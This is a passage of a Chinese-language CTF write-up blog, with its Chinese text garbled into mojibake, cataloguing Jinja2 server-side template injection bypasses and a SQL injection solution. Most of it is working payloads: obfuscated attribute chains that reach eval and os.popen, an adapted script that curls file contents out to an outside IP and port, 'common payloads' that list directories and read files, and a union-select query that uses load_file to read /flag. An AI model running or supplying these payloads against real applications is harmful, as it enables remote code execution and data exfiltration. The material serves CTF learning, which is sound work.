|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")      
//__base__

|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()
//__subclasses__

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(202)   
//__getitem__

|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")  
//__init__

|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f") 
//__globals__

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")
//__getitem__('__builtins')

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x65\x76\x61\x6c") 
//__getitem__('eval')

("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29")
//("__import__('os').popen('cat flag.txt').read()")
)%&#125;</code></pre>
<p>#0x0A</p>
<p>åœ¨jinja2é‡Œé¢å¯ä»¥åˆ©ç”¨~è¿›è¡Œæ‹¼æ¥</p>
<pre><code>&#123;% set a='__cla' %&#125;&#123;% set b='ss__'%&#125;&#123;%print( ''[a~b])%&#125;</code></pre>
<p>#0x0B</p>
<p>å¤§å°å†™è½¬æ¢</p>
<p>å‰ææ˜¯è¿‡æ»¤çš„åªæ˜¯å°å†™</p>
<pre><code>&#123;&#123;''["__CLASS__".lower()]&#125;&#125;</code></pre>
<p>#0x0C</p>
<p>æ‹¼æ¥</p>
<pre><code>&quot;cla&quot;+&quot;ss&quot;</code></pre>
<p>åè½¬</p>
<pre><code>&quot;__ssalc__&quot;[::-1]</code></pre>
<pre><code>&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)
&quot;&quot;[&quot;__ssalc__&quot;[::-1]]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>
<p>#0x0D</p>
<p>é™¤äº†ç¬¬ä¸€ä¸ªå…¶ä»–å‡ ä¸ªæˆ‘æµ‹çš„æ—¶å€™ä¼šå‡ºé”™ã€‚ä¸çŸ¥é“ä¸ºå•¥ï¼ï¼</p>
<pre><code>&#123;&#123;url_for.__globals__['__builtins__']&#125;&#125;
&#123;&#123;url_for.__globals__.__getitem__('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.pop('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.get('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.setdefault('__builtins__')&#125;&#125;</code></pre>
<p><strong>è¿‡æ»¤å™¨</strong></p>
<pre><code>Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may 
have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is 
applied to the next.
For example, &#123;&#123; name|striptags|title &#125;&#125; will remove all HTML Tags from variable name and title-case the
output (title(striptags(name))).

å˜é‡å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨ä¿®æ”¹ã€‚è¿‡æ»¤å™¨ä¸å˜é‡ä¹‹é—´ç”¨ç®¡é“ç¬¦å·ï¼ˆ|ï¼‰éš”å¼€ï¼Œæ‹¬å·ä¸­å¯ä»¥æœ‰å¯é€‰å‚æ•°ã€‚å¯ä»¥é“¾æ¥å¤š
ä¸ªè¿‡æ»¤å™¨ã€‚ä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºåº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚

ä¾‹å¦‚ï¼Œ&#123;&#123; name|striptags|title &#125;&#125; å°†åˆ é™¤å˜é‡åä¸­çš„æ‰€æœ‰HTMLæ ‡è®°ï¼Œå¹¶å°†titleå¤§å°å†™ä¸ºè¾“å‡º(title(striptags(name)))ã€‚</code></pre>
<p>attr</p>
<pre><code>Get an attribute of an object. foo|attr(&quot;bar&quot;) works like foo.bar just that always an attribute is returned and 
items are not looked up.</code></pre>
<p>ä¹Ÿå°±æ˜¯è¯´ attrç”¨äºè·å–å˜é‡</p>
<p>å…·ä½“å®ä¾‹çœ‹ä¸Šé¢ï¼</p>
<p>format</p>
<pre><code>&#123;&#123; "%s, %s!"|format(greeting, name) &#125;&#125;</code></pre>
<pre><code>&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)] ==&quot;&quot;.__class__</code></pre>
<p>join</p>
<pre><code>Return a string which is the concatenation of the strings in the sequence. The separator between elements is an
empty string per default, you can define it with the optional parameter:

&#123;&#123; [1, 2, 3]|join('|') &#125;&#125;
    -&gt; 1|2|3

&#123;&#123; [1, 2, 3]|join &#125;&#125;
    -&gt; 123
It is also possible to join certain attributes of an object:
&#123;&#123; users|join(', ', attribute='username') &#125;&#125;</code></pre>
<pre><code>&quot;&quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] æˆ–è€… &quot;&quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]  ==  &quot;&quot;.__class__</code></pre>
<p>replace reverse</p>
<p>å¯ä»¥åˆ©ç”¨æ›¿æ¢å’Œåè½¬è¿˜åŸå›æˆ‘ä»¬è¦ç”¨çš„å­—ç¬¦ä¸²</p>
<pre><code>&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) æ„é€ å‡ºå­—ç¬¦ä¸² &quot;__class__&quot;
&quot;__ssalc__&quot;|reverse æ„é€ å‡º &quot;__class__&quot;</code></pre>
<p>string</p>
<pre><code>().__class__   å‡ºæ¥çš„æ˜¯&lt;class &#39;tuple&#39;&gt;
(().__class__|string)[0] å‡ºæ¥çš„æ˜¯&lt;</code></pre>
<p>select unique</p>
<pre><code>Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.
If no test is specified, each object will be evaluated as a boolean.
é€šè¿‡å¯¹æ¯ä¸ªå¯¹è±¡åº”ç”¨æµ‹è¯•å¹¶ä»…é€‰æ‹©æµ‹è¯•æˆåŠŸçš„å¯¹è±¡æ¥ç­›é€‰å¯¹è±¡åºåˆ—ã€‚
å¦‚æœæ²¡æœ‰æŒ‡å®šæµ‹è¯•ï¼Œåˆ™æ¯ä¸ªå¯¹è±¡éƒ½å°†è¢«è®¡ç®—ä¸ºå¸ƒå°”å€¼

Returns a list of unique items from the given iterable.</code></pre>
<pre><code>()|select|string
ç»“æœå¦‚ä¸‹
&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;
012345678901234567890123456789012345678901234567890123456</code></pre>
<p>æ‹¼æ¥</p>
<pre><code>(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]

å¾—åˆ°å­—ç¬¦ä¸² __class__</code></pre>
<p>list</p>
<p>è½¬æ¢æˆåˆ—è¡¨<br>æ›´å¤šçš„ç”¨é€”æ˜¯é…åˆä¸Šé¢çš„stringè½¬æ¢æˆåˆ—è¡¨ï¼Œå°±å¯ä»¥è°ƒç”¨åˆ—è¡¨é‡Œé¢çš„æ–¹æ³•å–å­—ç¬¦äº†<br>åªæ˜¯å•çº¯çš„å­—ç¬¦ä¸²çš„è¯å–å•ä¸ªå­—ç¬¦æ–¹æ³•æœ‰é™</p>
<pre><code>(()|select|string)[0]
å¦‚æœä¸­æ‹¬å·è¢«è¿‡æ»¤äº†ï¼ŒæŒºéš¾çš„
ä½†æ˜¯åˆ—è¡¨çš„è¯å°±å¯ä»¥ç”¨popå–ä¸‹æ ‡äº†
å½“ç„¶éƒ½å¯ä»¥ä½¿ç”¨__getitem__</code></pre>
<pre><code>(()|select|string|list).__getitem__(24)~
(()|select|string|list).pop(24)~
(()|select|string|list)|attr(&#39;__getitem__&#39;)(15)~</code></pre>
<p>lengthï¼Œcount</p>
<p>è·å–æ•°å­—</p>
<pre><code>&#123;%set pp=dict(po=a,p=a)|join|length%&#125; = 3
&#123;%set pp=dict(p=a)|join|length%&#125; = 1
&#123;%set pp=dict(p=a)|join|count%&#125; = 1</code></pre>
<p><strong>printè¢«ban å¯ä»¥ç”¨åå¼¹shellï¼Œè´´ä¸ªåˆ«äººçš„è„šæœ¬</strong></p>
<pre><code>?name=
&#123;% set c=dict(c=z)|join|length %&#125;
&#123;% set cc=dict(cc=z)|join|length %&#125;
&#123;% set ccc=dict(ccc=z)|join|length %&#125;
&#123;% set cccc=dict(cccc=z)|join|length %&#125;
&#123;% set ccccc=dict(ccccc=z)|join|length %&#125;
&#123;% set cccccc=dict(cccccc=z)|join|length %&#125;
&#123;% set ccccccc=dict(ccccccc=z)|join|length %&#125;
&#123;% set cccccccc=dict(cccccccc=z)|join|length %&#125;
&#123;% set ccccccccc=dict(ccccccccc=z)|join|length %&#125;
&#123;% set cccccccccc=dict(cccccccccc=z)|join|length %&#125;
&#123;% set space=(()|select|string|list).pop(ccccc*cc) %&#125;
&#123;% set xhx=(()|select|string|list).pop(ccc*cccccccc) %&#125;
&#123;% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %&#125;
&#123;% set maohao=(config|string|list).pop(cc*ccccccc) %&#125;
&#123;% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %&#125;
&#123;% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %&#125;
&#123;% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %&#125;
&#123;% set open=(lipsum|attr(globals)).get(builtins).open %&#125;
&#123;% set result=open((xiegang,dict(flag=z)|join)|join).read() %&#125;
&#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,c,c,cccccccc,point,ccc,c,point,c,cccccc,cccccccc,point,c,ccccccccc,cccccccc,maohao,ccc,ccccccccc,c,c,c,xiegang,result)|join %&#125; 
&#123;% set ohs=dict(o=z,s=z)|join %&#125;
&#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</code></pre>
<p><strong>å¸¸ç”¨payload</strong></p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__")('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
// æŸ¥çœ‹æ ¹ç›®å½•</code></pre>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
//è¯»å–æ–‡ä»¶</code></pre>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__impo'+'rt__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
<h3 id="bsetDB"><a href="#bsetDB" class="headerlink" title="bsetDB"></a>bsetDB</h3><p>è¿™é¢˜æ²¡åšè¿‡ï¼ŒæœåŠ¡å™¨ç›´æ¥å´©æ‰ã€‚çœ‹äº†åˆ«äººçš„wpï¼Œéš¾åº¦å®¹æ˜“ã€‚</p>
<p>è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢+load_fileæ–‡ä»¶è¯»å–</p>
<p>æ³¨é‡Šä¸­ç»™äº†sqlæŸ¥è¯¢å¥å­ã€‚</p>
<pre><code>&lt;!-- SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot; --!&gt;</code></pre>
<p>è¿‡æ»¤äº†å•å¼•å·ï¼Œç©ºæ ¼ã€‚ä½†åŒå¼•å·æ²¡æœ‰è¢«ban</p>
<p>ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•æŒºå¤šçš„ï¼Œä¸åˆ—ä¸¾äº†ã€‚</p>
<pre><code>l&quot;/**/union/**/select/**/1,2,3#
æ¥ä¸‹å»å°±æ˜¯æ—¥å¸¸æŸ¥è¡¨ï¼ŒæŸ¥å­—æ®µï¼ŒæŸ¥æ•°æ®ã€‚
å›æ˜¾å‡ºflag.txt ä½†å¬è¯´æ–‡ä»¶åœ¨/flagé‡Œ

è¯»æ•°æ®äº†è¿™é‡Œä½¿ç”¨load_file()å‡½æ•°
l&quot;/**/union/**/select/**/(select/**/load_file(0x2f666c6167)),2,3#</code></pre>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
<p><a target="_blank" rel="noopener" href="https://shimo.im/docs/lf9OcEmdH70MC17f">https://shimo.im/docs/lf9OcEmdH70MC17f</a></p>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">å†…ç½‘æ¸—é€ç¯‡-NTLM Relayæ”»å‡»</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">å†…ç½‘æ¸—é€ç¯‡-éçº¦æŸ/çº¦æŸå§”æ´¾æ”»å‡»</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">å†…ç½‘æ¸—é€ç¯‡-éš§é“ä»£ç†</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTSååºåˆ—åŒ–æ¼æ´åˆ†æ</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>